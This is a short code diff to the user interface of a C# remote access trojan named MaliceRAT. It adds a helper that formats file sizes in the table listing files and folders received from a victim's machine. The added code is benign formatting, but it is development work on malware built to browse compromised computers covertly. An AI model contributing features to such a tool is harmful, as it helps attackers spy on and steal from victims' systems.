@@ -31,6 +31,24 @@ namespace MaliceRAT.RatUI
         #endregion
 
         #region Methods
+        private string FormatFileSize(string sizeInBytes)
+        {
+            if (!long.TryParse(sizeInBytes, out long bytes))
+                return sizeInBytes;
+
+            string[] suffixes = { "B", "KB", "MB", "GB", "TB", "PB" };
+            int suffixIndex = 0;
+            double size = bytes;
+
+            while (size >= 1024 && suffixIndex < suffixes.Length - 1)
+            {
+                size /= 1024;
+                suffixIndex++;
+            }
+
+            return $"{size:0.##} {suffixes[suffixIndex]}";
+        }
+
         private void OnFilesAndFoldersReceived(Victim victim, string filesAndFoldersJson)
         {
             if (InvokeRequired)
@@ -54,7 +72,8 @@ namespace MaliceRAT.RatUI
             foreach (var entry in filesAndFolders)
             {
                 var row = new DataGridViewRow();
-                row.CreateCells(gunaFilesTable, entry.Key, entry.Value["Type"], entry.Value["Size"]);
+                string formattedSize = entry.Value["Type"] == "DIRECTORY" ? "" : FormatFileSize(entry.Value["Size"]);
+                row.CreateCells(gunaFilesTable, entry.Key, entry.Value["Type"], formattedSize);
                 gunaFilesTable.Rows.Add(row);
             }
         }
